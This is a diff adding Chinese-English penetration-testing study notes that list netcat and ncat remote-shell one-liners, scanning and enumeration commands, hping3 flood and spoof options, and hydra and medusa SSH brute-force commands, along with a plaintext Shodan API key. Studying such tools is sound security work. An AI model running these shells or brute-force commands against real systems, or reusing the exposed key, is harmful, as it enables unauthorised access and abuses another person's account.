@@ -1,0 +1,219 @@
+nc：
+	nc -lp 333 -c bash
+	nc IP 333
+
+	nc -lp 333
+	nc IP 333 -c bash
+ncat
+	ncat -c bash --allow IP -vnl 333 --ssl
+	ncat -nv IP 333 --ssl
+wireshark
+	Egine:
+		linux:libpcap
+		windows:wincap
+tcpdump
+	default:68bytes
+	-w file
+	-i	eth0
+	-s 0表示all
+	-r a.cap表示读取
+	-A first args，ascii
+	-X 十进制显示
+	tcp port 22
+	-n ip print
+	-n src host ipaddr
+	-n dest host ipaddr
+高级筛选示例：
+	tcpdump -A -n 'tcp[13]=24' ,24表示flag位的十进制表示法
+
+dradis
+	可以导入扫描工具的日志文件，进行分析
+信息收集：
+	被动信息采集：
+		DNS:ptr反向域名解析,解析到不同的ip地址，智能dns
+			nslookup：
+				server
+				set type|q=a|mx|ptr|ns|any|spf
+				spf发垃圾邮件，
+			nslookup -q=any sina.com 114.114.114.114
+字典生成：
+	cupp:https://github.com/Mebus/cupp.git
+图像信息：
+	exiftool 
+recon-ng
+	重量级工具，全特性的web侦查框架
+	完整的被动收集的工具框架，包含所有的任务
+	使用方法：
+		模快
+		数据库	
+		报告
+	全局选项：
+		help 帮助
+		shodanAPI:L26qAhWndDe4xLP9dh9DwswYcWXBSknN
+		-w workspace,生成一个工作区
+		-r load from resource file
+	>workspace list
+	>keys add shodan_api 
+	>search
+	>set 
+	>show options
+	>set USER_AGENT   || unset USER_AGENT
+	>show schema
+	>run
+	>brute
+	>search resolve
+	>set SOURCE query select host from hosts
+二层发现：
+	arping:
+		可查看mac地址
+		-c 1
+		-d 查找网络中arp欺骗的ip
+	nmap:
+		-sn host discovery,同时会反向dns解析 -n
+		-iL list simply hosts
+	netdiscover
+		-i device
+		-r range
+		-p passive mode，not send anything
+		-l file
+		netdiscover -i eth0 -r 192.168.10.0/24
+		netdiscover -p
+	scapy
+		python，网络数据包分析工具，创建，修改，重放
+	>>>ARP()
+	>>>ARP()display()
+	>>>arp=ARP()
+	>>>arp.pdst="192.168.10.1"
+	>>>sr1(arp,timeout=1,verbose=1)
+	>>>answer=sr1(arp)
+	>>>answer.display()
+三层发现，ip，icmp
+	traceroute
+	ping -R 
+	scapy	
+		i=IP()
+		p=ICMP()
+		ping=(i/ip)
+		ping[IP].dst
+		sr1(IP(dst="")/ICMP())
+	nmap
+		nmap -sn
+	fping
+		-c 1
+		-g 192.168.10.0/24 | 192.168.10.1 192.168.10.100
+	hping
+		只能扫描一个主机
+		hping ip -icmp -c 2
+四层发现：
+	scapy
+	sr1(IP(dst="")/TCP(dport=80,flags="A"),timeout=1))
+	
+	nmap:
+		-PS/PA/PU -sn SYN ACK UDP discovery
+		nmap IP -PS/PS/PA/PU[PORT] -sn
+	hping3:
+		only package
+		-a --rand-source
+		--flood --fast
+		--udp(-2) -c 1 udp四层发现
+	防止syn攻击
+		1.ss -a | grep SYN
+		2.修改内核参数
+			net.ipv4.tcp_max_syn_backlog = 1024
+			net.ipv4.tcp_syncookies = 1
+			net.ipv4.tcp_synack_retries = 5
+			net.ipv4.tcp_syn_retries = 5
+		3.syn洪水攻击
+			iptables -A FORWARD -p tcp --syn -m limit --limit 1/s -j ACCEPT
+		4.防止端口扫描
+			iptables -A FORWARD -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s -j ACCEPT	
+		5.死亡ping
+			iptables -A FORWARD -p icmp --icmp-type 8 -j DROP
+端口扫描
+	scan techniques
+	udp扫描：
+		-sU UDP scan
+		-sS 
+		--open
+	tcp扫描：
+		sr1(IP(dst="")/TCP(flag="S", dport=22),timeout=1)
+		三次握手状态变换端口扫描
+		隐蔽扫描：
+			syn包
+			-sS
+		僵尸扫描：
+			实施条件苛刻
+			DDOS一般为真实地址，边界路由器添加策略
+			僵尸机：闲置系统，IPID递增（linux随机)
+			
+	hping
+		hping3 -c 10 -S --spoof -p ++1 --scan 1-100  IP
+		
+	dmitry:
+		dmitry -p 
+	nc
+		nc -nv -w 1 -z IP 1-100
+服务扫描：
+	nmap 
+		/usr/share/nmap/script/
+		--script=
+		-B banner信息发现
+		-sV 服务发现		
+	amap
+		-qb
+操作系统扫描
+	ttl标识：可被修改
+		64:linux
+		128:windows
+	nmap -O ip
+	xprobe2 IP
+	被动扫描：
+		p0f
+SNMP:
+	client: 162
+	server: udp/161
+	onesixtyone 
+	snmpwalk 
+		snmpwalk IP -c public -v 2c
+		snmpcheck -t IP
+SMB扫描：
+	nmap -v -p139,445 IP-range
+		--script=/usr/share/nmap/scripts/*
+		smb-os-discovery.nse,可发现主机系统及属性信息
+		--script=smb-check-vulns -
+		-script-args=unsafe
+	nbtscan 
+		-r(137):可查看用户名 IP range 
+	enum4linux -a IP 
+SMTP扫描
+	nc -nv IP 25  VRFY root
+	nmap IP|DOMAIN -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}
+ssh暴力破解
+	hydra
+		hydra -l root  -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
+	medusa
+		medusa -M ssh -h 192.168.157.131 -u root -Pnewpass.txt
+		medusa -M ssh -h 192.168.157.131 -u root-P /root/newpass.txt -e ns -F 立即停止
+		medusa -M ssh -h192.168.157.131 -u root -P newpass.txt -Z h1u1.
+	patator
+		./patator.py ssh_login host=192.168.157.131user=root password=FILE0 0=/root/newpass.txt
+防火墙扫描：
+	-sA ack
+负载均衡扫描：
+	lbd FQDN	
+WAF扫描：
+	wafw00f --script=http-waf-detect.nse
+nmap参数：
+	-iR 100(num)
+	--exclude ip-host
+	-iL 子网掩码计算
+	-sV --version-intensity 9
+	--scan-delay 10s 每次探测延迟10s
+	-D 192.168.10.131 192.168.10.132 192.168.10.133 伪造源ip
+	-S -e eth0 IP  伪造源地址
+	-g10000 原地址port发送
+	--proxies 代理
+	--data=FFFFFFFFF
+	--spoof-mac	
+弱点扫描：
+	www.exploit-db.com
